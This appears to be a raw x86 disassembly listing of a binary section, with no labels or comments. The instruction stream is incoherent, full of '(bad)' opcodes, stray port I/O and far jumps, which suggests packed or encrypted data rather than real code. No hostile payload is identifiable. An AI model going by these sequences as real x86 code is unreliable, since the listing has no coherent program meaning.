  41c20f:	jno    0x41c249
  41c211:	jo     0x41c1b1
  41c213:	mov    ah,al
  41c215:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c216:	fwait
  41c217:	push   esp
  41c218:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c219:	push   ss
  41c21a:	into   
  41c21b:	mov    ebp,0x6debba67
  41c220:	pop    ebp
  41c221:	mov    WORD PTR [eax],gs
  41c223:	cmp    ch,cl
  41c225:	je     0x41c279
  41c227:	mov    ebp,0x183a72b8
  41c22c:	retf   
  41c22d:	fwait
  41c22e:	inc    ebx
  41c22f:	out    dx,eax
  41c230:	sub    al,0x58
  41c232:	cmp    DWORD PTR [edx+edx*8+0x3],esi
  41c236:	sub    BYTE PTR [edx+edi*4],ah
  41c239:	jbe    0x41c1f8
  41c23b:	lock out dx,eax
  41c23d:	and    al,BYTE PTR [esi]
  41c23f:	(bad)  
  41c240:	lods   eax,DWORD PTR ds:[esi]
  41c241:	(bad)  
  41c242:	xchg   ebp,eax
  41c243:	jp     0x41c29f
  41c245:	add    eax,0xace61657
  41c24a:	js     0x41c2c6
  41c24c:	inc    ebp
  41c24d:	fdivr  QWORD PTR [edi+0x55b9fe2c]
  41c253:	pop    ecx
  41c254:	push   esp
  41c255:	test   BYTE PTR ds:0x6877abd2,ch
  41c25b:	mov    esp,0xfb96f28
  41c260:	dec    esp
  41c261:	sbb    eax,0xa33c61e8
  41c266:	sub    al,0x49
  41c268:	jge    0x41c208
  41c26a:	sub    al,0x26
  41c26c:	and    BYTE PTR [ecx+0x57],bl
  41c26f:	idiv   DWORD PTR [ecx+eax*1]
  41c272:	push   ebp
  41c273:	test   al,0xc8
  41c275:	pushf  
  41c276:	mov    ebx,0xe19c5eee
  41c27b:	sbb    al,0x76
  41c27d:	sub    DWORD PTR [esp+ebp*2-0x7f],eax
  41c281:	inc    esp
  41c282:	div    BYTE PTR [edx+edi*1+0x13]
  41c286:	xor    DWORD PTR [eax+0x693390d6],0x794dd420
  41c290:	gs inc esp
  41c292:	mov    ebp,0x6b5f4ac4
  41c297:	jp     0x41c27c
  41c299:	retf   
  41c29a:	in     al,dx
  41c29b:	mov    esi,0x54f1a9b7
  41c2a0:	sub    al,0xb8
  41c2a2:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2a4:	lods   eax,DWORD PTR ds:[esi]
  41c2a5:	(bad)  
  41c2a6:	or     DWORD PTR [edx+ecx*1-0x17564499],ebx
  41c2ad:	or     ebp,DWORD PTR [ecx-0x25628bc4]
  41c2b3:	stos   DWORD PTR es:[edi],eax
  41c2b4:	and    bl,BYTE PTR [eax+0x1d]
  41c2b7:	cld    
  41c2b8:	lock aad 0x5d
  41c2bb:	(bad)  
  41c2be:	stc    
  41c2bf:	inc    esp
  41c2c0:	xchg   DWORD PTR [ebx-0x77],edx
  41c2c3:	fwait
  41c2c4:	xlat   BYTE PTR ds:[ebx]
  41c2c5:	jle    0x41c337
  41c2c7:	enter  0x2fc8,0xa2
  41c2cb:	adc    DWORD PTR [edx+0x21],0xe1babd50
  41c2d2:	xor    BYTE PTR [eax+0x7b61e469],0x55
  41c2d9:	cmp    edx,ecx
  41c2db:	popf   
  41c2dc:	fidiv  WORD PTR [esi]
  41c2de:	and    BYTE PTR [edi-0x37],al
  41c2e1:	shl    al,1
  41c2e3:	mov    edx,DWORD PTR [ebx]
  41c2e5:	fcmovne st,st(0)
  41c2e7:	jmp    0x41c2d8
  41c2e9:	xor    DWORD PTR [ecx+0x24],ebp
  41c2ec:	pop    esi
  41c2ed:	mov    bh,0x8b
  41c2ef:	lock lahf 
  41c2f1:	ins    BYTE PTR es:[edi],dx
  41c2f2:	int    0xa7
  41c2f4:	jb     0x41c31e
  41c2f6:	retf   
  41c2f7:	bound  ebp,QWORD PTR [edx+0x21cc9c89]
  41c2fd:	mov    bh,0x35
  41c2ff:	mov    bl,0xb3
  41c301:	and    edi,ecx
  41c303:	and    DWORD PTR [ecx-0x33],edi
  41c306:	sbb    DWORD PTR [ebx],ebp
  41c308:	push   0x30
  41c30a:	xor    DWORD PTR [ebp-0x4e15685d],ebx
  41c310:	pop    edi
  41c311:	ficomp DWORD PTR [eax+0x27]
  41c314:	imul   esi,DWORD PTR [esp+eax*2+0x6d],0xffffff85
  41c319:	pop    eax
  41c31a:	push   ss
  41c31b:	das    
  41c31c:	dec    ecx
  41c31d:	aas    
  41c31e:	cdq    
  41c31f:	lea    eax,[ecx+0x7f]
  41c322:	add    al,0x33
  41c324:	jno    0x41c2af
  41c326:	lea    edx,[ebx-0x1505e6e3]
  41c32c:	outs   dx,BYTE PTR gs:[esi]
  41c32e:	stc    
  41c32f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c330:	xor    BYTE PTR [esp+edx*4-0x1f8028e0],bh
  41c337:	or     bh,BYTE PTR [ecx]
  41c339:	outs   dx,BYTE PTR ds:[esi]
  41c33a:	pushf  
  41c33b:	jg     0x41c329
  41c33d:	add    eax,esi
  41c33f:	mov    edx,0x282d2500
  41c344:	icebp  
  41c345:	clc    
  41c346:	sub    BYTE PTR [ecx+0x20a43747],al
  41c34c:	ins    DWORD PTR es:[edi],dx
  41c34d:	dec    eax
  41c34e:	ja     0x41c380
  41c350:	pusha  
  41c351:	mov    dh,0xf1
  41c353:	adc    bl,BYTE PTR [esi-0x46]
  41c356:	pop    ss
  41c357:	xor    al,0xee
  41c359:	js     0x41c2e7
  41c35b:	scas   al,BYTE PTR es:[edi]
  41c35c:	fadd   DWORD PTR [ecx+0x373acc40]
  41c362:	or     BYTE PTR [ebx+0x3b48a23d],al
  41c368:	or     ch,BYTE PTR cs:[edx-0x175ebcf3]
  41c36f:	mov    dl,0xb3
  41c371:	xchg   BYTE PTR [edi],bh
  41c373:	and    DWORD PTR [edx+ecx*2+0x188c4f28],ecx
  41c37a:	ja     0x41c3e4
  41c37c:	jl     0x41c3d9
  41c37e:	sub    DWORD PTR ds:0xfdaa6620,ebp
  41c384:	xchg   edi,eax
  41c385:	popa   
  41c386:	cmp    DWORD PTR [ecx],eax
  41c388:	or     BYTE PTR [edi-0x18b11266],0xe6
  41c38f:	push   ds
  41c390:	jae    0x41c3a2
  41c392:	and    DWORD PTR [edx-0x11c9f039],edx
  41c398:	dec    ebx
  41c399:	pushf  
  41c39a:	imul   ebp,DWORD PTR [ebp-0x31e06cb8],0xdc067122
  41c3a4:	and    al,0x41
  41c3a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c3a7:	cwde   
  41c3a8:	fstp   st(3)
  41c3aa:	cmp    eax,0xd5f94db8
  41c3af:	std    
  41c3b0:	xchg   esi,eax
  41c3b1:	inc    edx
  41c3b2:	and    BYTE PTR [esi],bh
  41c3b4:	addr16 jno 0x41c34b
  41c3b7:	add    al,0xbe
  41c3b9:	outs   dx,BYTE PTR ds:[esi]
  41c3ba:	xchg   DWORD PTR [edi+eax*8-0x4e86dc47],esi
  41c3c1:	cs in  al,dx
  41c3c3:	xchg   edi,eax
  41c3c4:	pop    es
  41c3c5:	clc    
  41c3c6:	push   0x730c688e
  41c3cb:	out    dx,al
  41c3cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c3cd:	or     edx,DWORD PTR [ebx]
  41c3cf:	test   al,0xc9
  41c3d1:	arpl   WORD PTR [edx+0x2a],bx
  41c3d4:	inc    edx
  41c3d5:	jne    0x41c3b6
  41c3d7:	sub    eax,0x1de3776a
  41c3dc:	lahf   
  41c3dd:	xchg   ebx,eax
  41c3de:	shl    BYTE PTR [edi+esi*8-0xdb21e8b],0x31
  41c3e6:	jns    0x41c3d9
  41c3e8:	xchg   ecx,eax
  41c3e9:	dec    esp
  41c3ea:	jg     0x41c45c
  41c3ec:	sbb    DWORD PTR [ebx],ebx
  41c3ee:	pop    edx
  41c3ef:	fdiv   QWORD PTR [edi-0x54]
  41c3f2:	mov    eax,0x276bd4aa
  41c3f7:	xlat   BYTE PTR ds:[ebx]
  41c3f8:	int3   
  41c3f9:	sub    al,0xbc
  41c3fb:	pop    ecx
  41c3fc:	sbb    al,ch
  41c3fe:	push   cs
  41c3ff:	sti    
  41c400:	mov    dh,ch
  41c402:	shl    BYTE PTR [edx+0x25d30fed],1
  41c408:	fst    QWORD PTR ds:0x952038a1
  41c40e:	inc    ebp
  41c40f:	scas   eax,DWORD PTR es:[edi]
  41c410:	test   al,0xb3
  41c412:	jg     0x41c3c1
  41c414:	loope  0x41c3bd
  41c416:	nop
  41c417:	inc    ebx
  41c418:	jmp    0xb988:0x26e63307
  41c41f:	test   eax,esp
  41c421:	repz ss cdq 
  41c424:	mov    esi,0x31815469
  41c429:	fisttp QWORD PTR [ebp-0x3b1be136]
  41c42f:	mov    al,ds:0xdf868589
  41c434:	xlat   BYTE PTR ds:[ebx]
  41c435:	ror    BYTE PTR [esi+esi*8],0x48
  41c439:	ins    DWORD PTR es:[edi],dx
  41c43a:	dec    ebp
  41c43b:	push   ss
  41c43c:	ror    BYTE PTR [ecx-0x5b446582],1
  41c442:	test   BYTE PTR [ecx],cl
  41c444:	cmp    al,0x44
  41c446:	adc    eax,0x3d79e3e8
  41c44b:	xor    BYTE PTR [ecx+ecx*8+0x33fdd365],al
  41c452:	add    al,0xee
  41c454:	scas   al,BYTE PTR es:[edi]
  41c455:	jns    0x41c435
  41c457:	js     0x41c496
  41c459:	sbb    al,ch
  41c45b:	adc    BYTE PTR [edx+0x71],0xe7
  41c45f:	test   BYTE PTR [eax-0x2b3065b8],dh
  41c465:	push   edx
  41c466:	mov    bl,0x4a
  41c468:	sub    al,0xa3
  41c46a:	sub    dh,ah
  41c46c:	icebp  
  41c46d:	test   al,0xc3
  41c46f:	add    ebx,esp
  41c471:	in     al,dx
  41c472:	nop
  41c473:	xor    ebx,DWORD PTR [edi]
  41c475:	dec    ebp
  41c476:	test   al,0xd0
  41c478:	jb     0x41c4b4
  41c47a:	out    dx,al
  41c47b:	cmp    edi,ebp
  41c47d:	push   esi
  41c47e:	scas   eax,DWORD PTR es:[edi]
  41c47f:	and    ah,BYTE PTR [ecx+0x5]
  41c482:	sub    bl,ch
  41c484:	mov    al,ds:0xf409b985
  41c489:	fcomp  DWORD PTR [eax-0x45]
  41c48c:	dec    esp
  41c48d:	cmp    edx,DWORD PTR [ebp+0x22192606]
  41c493:	sub    al,BYTE PTR [esi+0x22]
  41c496:	push   ds
  41c497:	jno    0x41c4e4
  41c499:	and    esp,ecx
  41c49b:	lods   eax,DWORD PTR ds:[esi]
  41c49c:	(bad)  
  41c49d:	push   esp
  41c49e:	cmp    al,0xa0
  41c4a0:	fs cpuid 
  41c4a3:	mov    al,dl
  41c4a5:	adc    ebx,0xba9d5172
  41c4ab:	retf   
  41c4ac:	jmp    0xa0fd:0x17d05baa
  41c4b3:	mov    ebx,0xc57505a7
  41c4b8:	or     ebp,DWORD PTR [eax]
  41c4ba:	jle    0x41c4e5
  41c4bc:	push   ds
  41c4bd:	xor    al,0xe2
  41c4bf:	ss add al,0x9f
  41c4c2:	out    0x69,al
  41c4c4:	retf   
  41c4c5:	(bad)  
  41c4c6:	clc    
  41c4c7:	xchg   edi,eax
  41c4c8:	imul   edx,DWORD PTR [eax+edx*1],0xffffffca
  41c4cc:	and    BYTE PTR [esi],0x69
  41c4cf:	mov    bl,0x32
  41c4d1:	gs aad 0xb
  41c4d4:	daa    
  41c4d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c4d6:	stc    
  41c4d7:	add    BYTE PTR [eax+ecx*2-0x60],0xc4
  41c4dc:	or     dh,BYTE PTR [edi]
  41c4de:	inc    esp
  41c4df:	shl    DWORD PTR [ecx+0x74],0xbf
  41c4e3:	sub    eax,0xc8ee015a
  41c4e8:	adc    cl,BYTE PTR [esp+edi*2]
  41c4eb:	cmp    BYTE PTR [esi],ch
  41c4ed:	push   cs
  41c4ee:	jp     0x41c551
  41c4f0:	xor    DWORD PTR [ecx],ecx
  41c4f2:	or     DWORD PTR [esi+0x3e5a6eb4],eax
  41c4f8:	call   0x573f:0xc4c8a31b
  41c4ff:	add    eax,esp
  41c501:	adc    bl,al
  41c503:	addr16 das 
  41c505:	xor    cl,ch
  41c507:	mov    bh,0x6d
  41c509:	dec    esi
  41c50a:	push   edi
  41c50b:	push   edx
  41c50c:	or     edi,ecx
  41c50e:	cmp    DWORD PTR ds:0xd75efbba,0x11
  41c515:	jae    0x41c57e
  41c517:	out    0xc7,al
  41c519:	adc    BYTE PTR [ebx+0x5c],cl
  41c51c:	xor    esi,0xb344a3e4
  41c522:	retf   0x23d5
  41c525:	adc    DWORD PTR [esi-0x7f97f0b7],eax
  41c52b:	aad    0x7c
  41c52d:	pushf  
  41c52e:	pop    edx
  41c52f:	or     ah,BYTE PTR [esi+0x97b8bd4]
  41c535:	aas    
  41c536:	xor    eax,0xe711a698
  41c53b:	repz or ecx,DWORD PTR [ebp+0x52]
  41c53f:	inc    eax
  41c540:	sub    bl,0x53
  41c543:	jb     0x41c4d2
  41c545:	sbb    ch,al
  41c547:	jp     0x41c4da
  41c549:	push   esp
  41c54a:	push   ds
  41c54b:	icebp  
  41c54c:	in     al,dx
  41c54d:	call   DWORD PTR [ebx+0x14646632]
  41c553:	mov    DWORD PTR [edx+0x3b],eax
  41c556:	push   edx
  41c557:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c558:	repz (bad) [esi-0x79337b4a]
  41c55f:	mov    fs,eax
  41c561:	jbe    0x41c578
  41c563:	xchg   DWORD PTR [edx+0x3c40da6d],edi
  41c569:	pop    edx
  41c56a:	mov    eax,ds:0x8e8b6b3d
  41c56f:	dec    edx
  41c570:	loopne 0x41c538
  41c572:	push   esi
  41c573:	mov    eax,0x2990052e
  41c578:	and    al,0x2c
  41c57a:	and    edx,DWORD PTR [eax+edx*4-0x27]
  41c57e:	push   eax
  41c57f:	fsub   QWORD PTR [eax+eax*8+0x6b]
  41c583:	nop
  41c584:	js     0x41c51e
  41c586:	das    
  41c587:	pop    edx
  41c588:	sbb    dl,BYTE PTR [edx-0x22]
  41c58b:	xchg   esp,eax
  41c58c:	pop    ss
  41c58d:	add    DWORD PTR [esi],0xffffffc9
  41c590:	mov    al,0x5a
  41c592:	adc    eax,0x487b62e6
  41c597:	mov    eax,0x2daef20d
  41c59c:	lods   al,BYTE PTR ds:[esi]
  41c59d:	data16 aaa 
  41c59f:	jecxz  0x41c5d8
  41c5a1:	xor    al,BYTE PTR [eax+0x1a4d6191]
  41c5a7:	cmp    al,0x92
  41c5a9:	inc    edx
  41c5aa:	lea    esi,[esi+0x6d]
  41c5ad:	ja     0x41c5e9
  41c5af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c5b0:	sub    ch,BYTE PTR [ebx-0x1e]
  41c5b3:	dec    esi
  41c5b4:	jle    0x41c58e
  41c5b6:	cs out dx,al
  41c5b8:	push   edx
  41c5b9:	cld    
  41c5ba:	shl    ch,cl
  41c5bc:	out    dx,eax
  41c5bd:	xor    al,0xbd
  41c5bf:	mov    esp,0x83721572
  41c5c4:	jg     0x41c55c
  41c5c6:	ja     0x41c5d2
  41c5c8:	add    DWORD PTR [edi],ebp
  41c5ca:	loopne 0x41c576
  41c5cc:	pop    ebp
  41c5cd:	mov    DWORD PTR [eax+0x1d],esi
  41c5d0:	add    al,0xb3
  41c5d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c5d3:	xchg   edx,eax
  41c5d4:	jmp    0xfce4:0xb70035b3
  41c5db:	jns    0x41c576
  41c5dd:	xor    edx,edi
  41c5df:	(bad)  
  41c5e1:	xor    eax,0xaf486006
  41c5e6:	or     DWORD PTR [esi],eax
  41c5e8:	(bad)  
  41c5e9:	enter  0x6a5b,0xf
  41c5ed:	cwde   
  41c5ee:	sti    
  41c5ef:	add    BYTE PTR ds:0xf54501a8,cl
  41c5f5:	add    edx,DWORD PTR es:[edi]
  41c5f8:	push   ebx
  41c5f9:	sub    eax,0x737dbe12
  41c5fe:	push   0x712620b8
  41c603:	mov    WORD PTR [eax+eiz*1+0x3b],gs
  41c607:	imul   ebx,DWORD PTR [eax],0x2d73f033
  41c60d:	outs   dx,DWORD PTR ds:[esi]
  41c60f:	lods   al,BYTE PTR ds:[esi]
  41c610:	ins    BYTE PTR es:[edi],dx
  41c611:	inc    ecx
  41c612:	pop    ss
  41c613:	add    BYTE PTR [esi-0x48a2cc9f],al
  41c619:	idiv   ebp
  41c61b:	pop    ds
  41c61c:	xor    ebx,edx
  41c61e:	daa    
  41c61f:	imul   esi,DWORD PTR [ecx+0x78],0xd9eb93c6
  41c626:	(bad)  
  41c627:	jl     0x41c603
  41c629:	jl     0x41c67d
  41c62b:	ins    BYTE PTR es:[edi],dx
  41c62c:	pusha  
  41c62d:	jb     0x41c62e
  41c62f:	in     eax,0x39
  41c631:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c632:	or     dh,BYTE PTR [ecx-0x18288cb]
  41c638:	ins    BYTE PTR es:[edi],dx
  41c639:	rcl    DWORD PTR [ebp+eiz*1+0x57],1
  41c63d:	or     al,0xd4
  41c63f:	in     eax,0x46
  41c641:	sar    BYTE PTR [esi],1
  41c643:	or     DWORD PTR [edx-0x63],ebp
  41c646:	ja     0x41c6bd
  41c648:	pop    ds
  41c649:	ret    0xdf9e
  41c64c:	push   esi
  41c64d:	adc    ah,bl
  41c64f:	pushf  
  41c650:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c651:	add    eax,0x72807f67
  41c656:	lahf   
  41c657:	sub    al,0x3b
  41c659:	push   esi
  41c65a:	stos   BYTE PTR es:[edi],al
  41c65b:	dec    esp
  41c65c:	data16 das 
  41c65e:	sub    ebp,esi
  41c660:	xchg   edi,eax
  41c661:	jg     0x41c657
  41c663:	jg     0x41c695
  41c665:	add    esp,eax
  41c667:	shr    ebx,0x69
  41c66a:	test   BYTE PTR ds:0x3edb94ee,ah
  41c670:	inc    ebx
  41c671:	jl     0x41c60d
  41c673:	pop    edx
  41c674:	sub    al,0xa5
  41c676:	stos   DWORD PTR es:[edi],eax
  41c677:	and    BYTE PTR [ecx-0x1599e337],ah
  41c67d:	mov    ecx,0xe8437bc3
  41c682:	pop    edx
  41c683:	pop    esp
  41c684:	sbb    eax,0x9375e9b8
  41c689:	jl     0x41c698
  41c68b:	mov    al,ds:0x7778247c
  41c690:	ds (bad) 
  41c693:	push   esp
  41c694:	out    0x46,al
  41c696:	add    ebp,DWORD PTR [esp+edx*2]
  41c699:	ds jns 0x41c62f
  41c69c:	push   ebp
  41c69d:	adc    DWORD PTR [ecx+0x3f],0xc
  41c6a1:	sub    dh,bl
  41c6a3:	push   eax
  41c6a4:	jp     0x41c696
  41c6a6:	push   ds
  41c6a7:	pop    ebx
  41c6a8:	mov    cl,0xe9
  41c6aa:	mov    eax,0xa68238b7
  41c6af:	mov    DWORD PTR [ebx],eax
  41c6b1:	sub    ch,BYTE PTR [ecx-0x6c]
  41c6b4:	or     edx,DWORD PTR [ebx]
  41c6b6:	adc    DWORD PTR [eax+0x7db28009],ebp
  41c6bc:	(bad)  
  41c6bd:	lock push es
  41c6bf:	out    dx,eax
  41c6c0:	fldenv [esi+0x64571af1]
  41c6c6:	pop    edi
  41c6c7:	ficom  WORD PTR [esi+0x4fed7b8a]
  41c6cd:	enter  0xbd25,0x71
  41c6d1:	adc    bl,0x28
  41c6d4:	push   es
  41c6d5:	mov    DWORD PTR [esi],eax
  41c6d7:	in     al,dx
  41c6d8:	jge    0x41c6d2
  41c6da:	arpl   WORD PTR [ecx+ebp*8+0x7dd51f1f],ax
  41c6e1:	sbb    eax,0xf56e3d44
  41c6e6:	xchg   esi,eax
  41c6e7:	pop    edx
  41c6e8:	jp     0x41c6ad
  41c6ea:	je     0x41c718
  41c6ec:	mov    DWORD PTR [edx-0x1c24fa40],edx
  41c6f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c6f3:	add    bh,bh
  41c6f5:	addr16 and al,0x53
  41c6f8:	imul   edi,eax,0x18
  41c6fb:	inc    esi
  41c6fc:	mov    eax,0x84cffe4d
  41c701:	xchg   ebx,eax
  41c702:	inc    ebp
  41c703:	or     eax,0xc7f93b0f
  41c708:	pop    ds
  41c709:	jns    0x41c752
  41c70b:	div    DWORD PTR [ecx]
  41c70d:	pusha  
  41c70e:	push   esi
  41c70f:	or     al,0xe0
  41c711:	cmp    eax,0xf44d4749
  41c716:	mov    dh,0x21
  41c718:	jo     0x41c736
  41c71a:	or     DWORD PTR [ebx],ebx
  41c71c:	popa   
  41c71d:	sub    BYTE PTR [eax-0x360d3a08],ch
  41c723:	clc    
  41c724:	bound  edx,QWORD PTR [ebx]
  41c726:	icebp  
  41c727:	(bad)  
  41c728:	popf   
  41c729:	push   ecx
  41c72a:	or     edx,DWORD PTR ds:0x2d7f9d51
  41c730:	or     cl,BYTE PTR ss:[edi+esi*1]
  41c734:	dec    eax
  41c735:	sbb    dh,BYTE PTR [esi-0x727ece1a]
  41c73b:	test   BYTE PTR [edi+0x1c230ed3],0x2d
  41c742:	inc    esp
  41c743:	sbb    edi,esi
  41c745:	fld    TBYTE PTR [edi+ebp*8+0x46bdc12a]
  41c74c:	pop    esi
  41c74d:	scas   eax,DWORD PTR es:[edi]
  41c74e:	arpl   WORD PTR [edx-0x7ac043e6],ax
  41c754:	dec    ebx
  41c755:	sub    edx,eax
  41c757:	xchg   ecx,eax
  41c758:	mov    dh,BYTE PTR [eax+ecx*2-0x3a79318d]
  41c75f:	in     al,0xfa
  41c761:	push   esp
  41c762:	popf   
  41c763:	fmul   QWORD PTR [esi-0x6e07f9ca]
  41c769:	adc    eax,0x8f3da0e0
  41c76e:	aad    0x92
  41c770:	int3   
  41c771:	inc    ecx
  41c772:	aas    
  41c773:	sub    dl,ah
  41c775:	and    eax,0xd7f14ce
  41c77a:	dec    esi
  41c77b:	inc    esp
  41c77c:	mov    eax,ds:0xc4bdc465
  41c781:	adc    al,0xcc
  41c783:	out    dx,al
  41c784:	ds cmp edx,ebp
  41c787:	out    0xa2,eax
  41c789:	popf   
  41c78a:	or     BYTE PTR [eax-0xf32b8f0],bl
  41c790:	push   ds
  41c791:	sbb    DWORD PTR [esi],esp
  41c793:	pop    ecx
  41c794:	dec    esi
  41c795:	add    BYTE PTR [edi],bl
  41c797:	cmp    BYTE PTR [eax-0x4e],bl
  41c79a:	inc    eax
  41c79b:	mov    eax,ds:0xe8b10ea3
  41c7a0:	or     dh,dl
  41c7a2:	add    dh,BYTE PTR [ebx]
  41c7a4:	popa   
  41c7a5:	mov    al,0xa4
  41c7a7:	mov    ?,edx
  41c7a9:	popa   
  41c7aa:	test   al,0x2b
  41c7ac:	mov    al,ds:0x19c0ea3a
  41c7b1:	fsubr  DWORD PTR [ebp-0x16]
  41c7b4:	add    al,cl
  41c7b6:	(bad)  
  41c7b7:	xor    eax,0x40a66fb9
  41c7bc:	adc    al,0x72
  41c7be:	scas   eax,DWORD PTR es:[edi]
  41c7bf:	mov    cl,0xd
  41c7c1:	push   ss
  41c7c2:	inc    edx
  41c7c3:	adc    al,0x58
  41c7c5:	(bad)  
  41c7c6:	call   0x5de241c1
  41c7cb:	lock in al,dx
  41c7cd:	xor    eax,DWORD PTR [esi+0x54ccaf9d]
  41c7d3:	mov    al,ds:0x5886b741
  41c7d8:	in     al,dx
  41c7d9:	(bad)  
  41c7da:	mov    esi,0x82f481f2
  41c7df:	xchg   ebp,eax
  41c7e0:	test   DWORD PTR [edx+0x647b996d],ecx
  41c7e6:	call   esp
  41c7e8:	mov    WORD PTR [ebx+ecx*2+0x46],es
  41c7ec:	mov    eax,ds:0x8afc7650
  41c7f1:	dec    esi
  41c7f2:	xor    al,0xfb
  41c7f4:	lock shr DWORD PTR [ebx-0x74],cl
  41c7f8:	cmp    eax,ecx
  41c7fa:	or     DWORD PTR [esi+0x1e],esp
  41c7fd:	sub    eax,0x66c96799
  41c802:	inc    esp
  41c803:	xor    al,bl
  41c805:	sbb    eax,0x594a2d4a
  41c80a:	mov    ebp,0x7dcfed4b
  41c80f:	mov    dl,0x79
  41c811:	mov    eax,ds:0x71f769c6
  41c816:	out    dx,al
  41c817:	sbb    al,0xbd
  41c819:	ins    DWORD PTR es:[edi],dx
  41c81a:	cwde   
  41c81b:	push   esi
  41c81c:	pop    ss
  41c81d:	push   0xe6908324
  41c822:	stc    
  41c823:	test   eax,0x56fb528
  41c828:	jnp    0x41c896
  41c82a:	gs pop es
  41c82c:	loope  0x41c822
  41c82e:	or     eax,0xbb3d0dc9
  41c833:	test   ebx,0x605e455f
  41c839:	ret    
  41c83a:	sub    BYTE PTR [esi-0x27161184],cl
  41c840:	gs mov esi,0xc1462829
  41c846:	pusha  
  41c847:	je     0x41c80b
  41c849:	mov    bl,0xe8
  41c84b:	addr16 jbe 0x41c7f0
  41c84e:	jb     0x41c878
  41c850:	cmp    ah,BYTE PTR [eax+0x47]
  41c853:	mov    ebp,0xd7641085
  41c858:	nop
  41c859:	pop    ebp
  41c85a:	repnz repz and BYTE PTR [ebp+esi*2-0x566830f3],0x1d
  41c864:	stos   BYTE PTR es:[edi],al
  41c865:	dec    esi
  41c866:	fstp   QWORD PTR [ecx+0x42]
  41c869:	and    al,0x8b
  41c86b:	fdiv   DWORD PTR [ecx-0x78]
  41c86e:	leave  
  41c86f:	jne    0x41c824
  41c871:	jb     0x41c8d4
  41c873:	pop    ds
  41c874:	fldenv [ebx]
  41c876:	repnz xchg esi,eax
  41c878:	xchg   esp,eax
  41c879:	adc    al,0xda
  41c87b:	leave  
  41c87c:	lods   al,BYTE PTR ds:[esi]
  41c87d:	out    dx,eax
  41c87e:	outs   dx,BYTE PTR ds:[esi]
  41c87f:	in     eax,dx
  41c880:	mov    al,ds:0x7844d2f1
  41c885:	mov    bl,BYTE PTR ds:0xaa41c39d
  41c88b:	test   DWORD PTR [edx-0x71e49174],ebp
  41c891:	stos   DWORD PTR es:[edi],eax
  41c892:	mov    es,WORD PTR [edx+0x14]
  41c895:	jg     0x41c87d
  41c897:	mov    esi,eax
  41c899:	loop   0x41c873
  41c89b:	jle    0x41c86c
  41c89d:	inc    eax
  41c89e:	adc    al,0xe9
  41c8a0:	jno    0x41c855
  41c8a2:	or     eax,0xe4e6b02c
  41c8a7:	sub    BYTE PTR [edx],ah
  41c8a9:	cli    
  41c8aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c8ab:	in     eax,0xf
  41c8ad:	fsub   st,st(0)
  41c8af:	add    eax,0x9b8aa289
  41c8b4:	mov    ds:0xc869f2a4,al
  41c8b9:	mov    bh,dh
  41c8bb:	fistp  WORD PTR [ecx+0x5c1f67a9]
  41c8c1:	sbb    ch,BYTE PTR [ebx]
  41c8c3:	out    dx,eax
  41c8c4:	push   cs
  41c8c5:	xor    bl,bl
  41c8c7:	pop    ebx
  41c8c8:	(bad)
  41c8cb:	pop    ds
  41c8cc:	ficom  WORD PTR [edi]
  41c8ce:	outs   dx,DWORD PTR ds:[esi]
  41c8cf:	dec    ecx
  41c8d0:	mov    ds:0x73d9cbfa,al
  41c8d5:	pop    esi
  41c8d6:	xchg   BYTE PTR [ebx],bh
  41c8d8:	cmp    bl,BYTE PTR [ebp+0x0]
  41c8db:	and    dl,dh
  41c8dd:	push   es
  41c8de:	arpl   WORD PTR ds:0xa16ae456,di
  41c8e4:	icebp  
  41c8e5:	fucomp st(6)
  41c8e7:	ficom  DWORD PTR [ebx-0x21c85b6e]
  41c8ed:	dec    ecx
  41c8ee:	(bad)  
  41c8ef:	push   ebp
  41c8f0:	and    BYTE PTR [esi+0x7f],bl
  41c8f3:	outs   dx,DWORD PTR ds:[esi]
  41c8f4:	adc    BYTE PTR ds:[ecx+0x51],al
  41c8f8:	jo     0x41c8e1
  41c8fa:	je     0x41c8a2
  41c8fc:	repnz fucomi st,st(3)
  41c8ff:	repnz push 0xf7898f85
  41c905:	into   
  41c906:	out    0x72,eax
  41c908:	add    BYTE PTR [eax],cl
  41c90a:	mov    ebp,0x796e149c
  41c90f:	arpl   sp,bp
  41c911:	mov    edx,0x8306c12d
  41c916:	(bad)  
  41c917:	push   ss
  41c918:	scas   eax,DWORD PTR es:[edi]
  41c919:	mov    ah,0x68
  41c91b:	xlat   BYTE PTR ds:[ebx]
  41c91c:	mov    bh,0x35
  41c91e:	icebp  
  41c91f:	outs   dx,BYTE PTR ds:[esi]
  41c920:	out    0x89,al
  41c922:	in     al,0x7
  41c924:	push   ebp
  41c925:	sbb    BYTE PTR [edx],dh
  41c927:	cld    
  41c928:	(bad)  
  41c929:	jae    0x41c9a4
  41c92b:	mov    dl,0x4c
  41c92d:	mov    bh,0x30
  41c92f:	mov    al,0x33
  41c931:	int    0xf6
  41c933:	cmp    cl,cl
  41c935:	adc    al,0x98
  41c937:	jle    0x41c9ae
  41c939:	jg     0x41c8bc
  41c93b:	mov    edi,0xa7679ea1
  41c940:	fiadd  DWORD PTR [eax]
  41c942:	or     al,0xff
  41c944:	clc    
  41c945:	es popf 
  41c947:	fucomi st,st(4)
  41c949:	fucomi st,st(0)
  41c94b:	inc    edx
  41c94c:	jmp    0x106c:0xf42feef8
  41c953:	mov    WORD PTR [ecx+0x3abb29fe],fs
  41c959:	mov    DWORD PTR [edx-0x6b],eax
  41c95c:	mov    ch,0x94
  41c95e:	ret    0x3921
  41c961:	mov    ecx,0xafde4bf5
  41c966:	(bad)  
  41c968:	mov    dh,0xa
  41c96a:	push   ecx
  41c96b:	xchg   esi,eax
  41c96c:	aas    
  41c96d:	push   0x1
  41c96f:	and    edi,edx
  41c971:	js     0x41c9e0
  41c973:	pushf  
